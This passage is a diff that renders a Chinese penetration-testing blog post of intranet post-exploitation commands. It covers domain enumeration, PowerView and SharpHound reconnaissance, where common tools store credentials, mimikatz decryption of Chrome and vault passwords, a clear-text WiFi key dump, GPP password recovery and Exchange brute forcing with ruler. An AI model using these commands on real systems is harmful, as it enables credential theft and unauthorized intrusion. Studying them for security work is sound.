@@ -1,37 +1,1510 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="域内信息搜集查看域用户，普通域用户权限 1net user &#x2F;domain  将自动选择归属域、并查询 查看域管理员 1net group &quot;domain admins&quot; &#x2F;domain  域管理组 Domain Admins组 快速定位域控ip，一般是dns、时间服务器 1234net time &#x2F;domain# 展示域内时间服务器nslookup -type&#x3D;all_lda">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网命令记录">
+<meta property="og:url" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="laker&#39;s Blog">
+<meta property="og:description" content="域内信息搜集查看域用户，普通域用户权限 1net user &#x2F;domain  将自动选择归属域、并查询 查看域管理员 1net group &quot;domain admins&quot; &#x2F;domain  域管理组 Domain Admins组 快速定位域控ip，一般是dns、时间服务器 1234net time &#x2F;domain# 展示域内时间服务器nslookup -type&#x3D;all_lda">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104237064.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104420462.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104445027.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104509045.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104535673.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104742291.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701105635401.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701105705878.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110411871.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110603669.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110657757.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110745561.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701110806552.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701111635702.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701111704460.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701111929762.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701112438389.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701112558317.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701112657738.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701112943479.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113015556.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113037389.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113255779.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113310446.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113328183.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113347901.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113542743.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113611037.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113637432.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113815472.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113856505.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113928452.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701114129999.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701114219405.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701114254137.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701114426266.png">
+<meta property="article:published_time" content="2020-07-03T07:32:43.000Z">
+<meta property="article:modified_time" content="2020-07-03T07:33:06.000Z">
+<meta property="article:author" content="laker">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701104237064.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://laker.xyz/2020/07/03/内网命令记录/"/>
+
+
+
+
+
+  <title>内网命令记录 | laker's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">laker's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录渗透测试琐事仅仅</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="laker's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网命令记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-03T15:32:43+08:00">
+                2020-07-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h2><p><strong>查看域用户，普通域用户权限</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user /domain</span><br></pre></td></tr></table></figure>
+
+<p>将自动选择归属域、并查询</p>
+<p><strong>查看域管理员</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p>域管理组 Domain Admins组</p>
+<p><strong>快速定位域控ip，一般是dns、时间服务器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br><span class="line"># 展示域内时间服务器</span><br><span class="line">nslookup -type=all_ldap._tcp.dc._msdcs.jumbolab.com</span><br><span class="line"># 展示域内域名服务器</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看域控制器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domaincontrollers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a><strong>内网主机发现</strong></h3><p><strong>查看共享资料</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看arp表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看hosts文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">	linux:</span><br><span class="line">cat /etc/hosts</span><br><span class="line"></span><br><span class="line">	windows:</span><br><span class="line">type c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看dns缓存</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig  /displaydns</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用工具，比如nmap、nbtscan</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主动扫描，根据需求上传扫描工具与设置扫描频度</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>会话收集</strong></p>
+<p>在网内收集会话，如看管理员登录过哪些机器、机器被谁登录过，这样攻击的目标就会清晰很多</p>
+<p>可以使用NetSessionEnum api来查看其他主机上有哪些用户登录。</p>
+<p>api相关介绍如下：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum">https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum</a></p>
+<p><strong>利用Powershell脚本PowerView为例</strong>(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-zhong/p/11012764.html">https://www.cnblogs.com/-zhong/p/11012764.html</a>)</p>
+<p><strong>ps脚本执行权限获取</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy</span><br><span class="line">Set-ExecutionPolicy Unrestricted</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>查看域用户登录过哪些机器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Invoke-UserHunter -UserName &quot;win7user（域用户名）&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用PowerView别样信息搜集</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Get-NetDomain  # 获取当前的域名称</span><br><span class="line">Get-Netuser # 返回所有域内成员的详细信息</span><br><span class="line">Get-NetDomainController # 获取所有的域内的控制器信息</span><br><span class="line">Get-NetComputer  # 获取所有域内机器的名称</span><br><span class="line">Get-Netshare  # 获取域内的所有的网络共享</span><br><span class="line">Get-NetRDPSESSION  # 获取指定服务的远程连接信息 </span><br><span class="line">Get-NetProcess  # 获取进程的详细信息</span><br><span class="line">Get-ADOPJECT  # 获取活动目录的信息</span><br><span class="line">Invoke-ProcessHunter # 获取登陆计算机且判断用户是否有管理员权限</span><br></pre></td></tr></table></figure>
+
+<p><strong>只有cmd命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass &quot;import-module c:\powershell.ps1;Get-NetUser&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>凭据收集</strong></p>
+<p>拿下一台机器后，需要尽可能的收集信息。如下是几个常用软件保存密码的注册表地址，可以根据算法去解密保存的账号密码。</p>
+<p><strong>远程连接凭据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey/list</span><br></pre></td></tr></table></figure>
+
+<p><strong>各种工具历史连接</strong></p>
+<p>*Navicat   (存放在注册表)*：</p>
+<table>
+<thead>
+<tr>
+<th>MySQL</th>
+<th>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your  connection name&gt;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MariaDB</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your  connection name&gt;</td>
+</tr>
+<tr>
+<td>MongoDB</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your  connection name&gt;</td>
+</tr>
+<tr>
+<td>Microsoft  SQL</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your  connection name&gt;</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your  connection name&gt;</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your  connection name&gt;</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your  connection name&gt;</td>
+</tr>
+</tbody></table>
+<p>*SecureCRT   (存放在文件)*：</p>
+<table>
+<thead>
+<tr>
+<th>xp/win2003</th>
+<th align="left">C:\Documents  and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>win7/win2008以上</td>
+<td align="left">C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td>
+</tr>
+</tbody></table>
+<p>*Xshell   (存放在文件)*：</p>
+<table>
+<thead>
+<tr>
+<th>Xshell 5</th>
+<th align="left">%userprofile%\Documents\NetSarang\Xshell\Sessions</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Xshell 6</td>
+<td align="left">%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions</td>
+</tr>
+</tbody></table>
+<p>*WinSCP   (存放在注册表)*：</p>
+<p>​    HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</p>
+<p><em>VNC   (存放在注册表/文件)</em>:</p>
+<table>
+<thead>
+<tr>
+<th>RealVNC</th>
+<th align="left">HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TightVNC</td>
+<td align="left">HKEY_CURRENT_USER\Software\TightVNC\Server  Value</td>
+<td>Password  or PasswordViewOnly</td>
+</tr>
+<tr>
+<td>TigerVNC</td>
+<td align="left">HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</td>
+<td>Password</td>
+</tr>
+<tr>
+<td>UltraVNC</td>
+<td align="left">C:\Program  Files\UltraVNC\ultravnc.ini</td>
+<td>passwd or  passwd2</td>
+</tr>
+</tbody></table>
+<hr>
+<p><strong>DPAPI</strong></p>
+<p>​    DPAPI，由微软从Windows 2000开始发布，称为Data ProtectionApplication Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 。</p>
+<p>其作用范围包括且不限于：</p>
+<p>​    Outlook客户端密码</p>
+<p>​    Windows credential凭据</p>
+<p>​    Chrome保存的密码凭据</p>
+<p>​    Internet explorer密码凭据</p>
+<p>在渗透中，可以利用mimikatz做到自动化的数据解密：</p>
+<p><strong>解密Chrome密码：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot; /unprotect</span><br></pre></td></tr></table></figure>
+
+<p><strong>解密Credential：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  vault::cred /patch</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>域信任</strong></p>
+<p>查看域信任：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest  /domain_trusts</span><br></pre></td></tr></table></figure>
+
+<p><strong>域传送</strong></p>
+<p>当存在域传送漏洞时，可以获取域名解析记录。当有了解析记录后，也能提高对网络环境的进一步认知，比如www解析的ip段可能在dmz区，mail解析的ip段可能在核心区域等等。</p>
+<p>windows：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup  -type=ns domain.comnslookupsserver  dns.domain.comls  domain.com</span><br></pre></td></tr></table></figure>
+
+<p>linux：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig  @dns.domain.com axfr domain.com</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>DNS记录获取</strong></p>
+<p>​    在网内收集dns记录，可以快速定位一些机器、网站。常用工具有Dnscmd、PowerView。</p>
+<p>​    在windows server上，可以使用Dnscmd工具获取dns记录。</p>
+<p>​    获取dns记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dnscmd ./ZonePrint jumbolab.com</span><br><span class="line">Dnscmd ./EnumRecords jumbolab.com .</span><br></pre></td></tr></table></figure>
+
+<p>​    在非windows server机器(Win10)上，可以使用PowerView获取。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module  PowerView.ps1Get-DNSRecord  -ZoneName jumbolab.com</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>WIFI</strong></p>
+<p>通过如下命令获取连接过的wifi密码：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f  &quot;skip=<span class="number">9</span> tokens=<span class="number">1</span>,<span class="number">2</span> delims=:&quot; %i <span class="keyword">in</span> (&#x27;netsh wlan show profiles&#x27;)  <span class="keyword">do</span> @<span class="built_in">echo</span> %j | <span class="built_in">findstr</span> -i -v <span class="built_in">echo</span> |  netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>GPP</strong></p>
+<p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。</p>
+<p>其中xml中的密码是aes加密的，密钥已被微软公开：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN</a></p>
+<p>可以使用相关脚本进行解密，如：</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
+<p>域用户登录脚本存在目录也会存在敏感文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\domain\Netlogon</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>Seatbelt</strong></p>
+<p>可以利用Seatbelt工具做一些自动化的信息收集，收集的信息很多，包括不限于google历史记录、用户等等</p>
+<p>当有了chrome的访问历史时，就可以知道该用户访问的一些内部站点的域名/IP，可以提高内网资产的摸索效率.</p>
+<p><strong>Bloodhound</strong></p>
+<p>我们可以利用Bloodhound做一些自动化的信息收集，包括用户、计算机、组织架构、最快的攻击途径等。但是自动化也意味着告警，该漏洞做自动化信息收集时，会在内网设备上产生大量的告警，按需使用。</p>
+<p>执行：</p>
+<p>​    SharpHound.exe  -c all</p>
+<p>运行完毕会生成一个zip压缩包，名字类似于20200526201154_BloodHound。</p>
+<p>导入Bloodhound后可以做可视化分析</p>
+<p>比较常用的就是寻找攻击域控的最快途径(Find Shortest Paths to Domain Admins功能)</p>
+<p><strong>Exchange</strong></p>
+<p>exchange一般都在域内的核心位置上，包括甚至安装在域控服务器上，因此我们需要多多关注exchange的相关漏洞，如果拿下exchange机器，则域控也不远了。</p>
+<blockquote>
+<p> 邮箱用户密码爆破</p>
+</blockquote>
+<p>​    使用ruler工具对owa接口进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler  --domain targetdomain.com brute --users /path/to/user.txt --passwords  /path/to/passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p>​    ruler工具会自动搜索owa可以爆破的接口，如：</p>
+<p>​    <a target="_blank" rel="noopener" href="https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml">https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml</a></p>
+<p>​    其他如ews接口也存在被暴力破解利用的风险：</p>
+<p>​    <a target="_blank" rel="noopener" href="https://mail.targetdomain.com/ews">https://mail.targetdomain.com/ews</a></p>
+<blockquote>
+<p>通讯录收集</p>
+</blockquote>
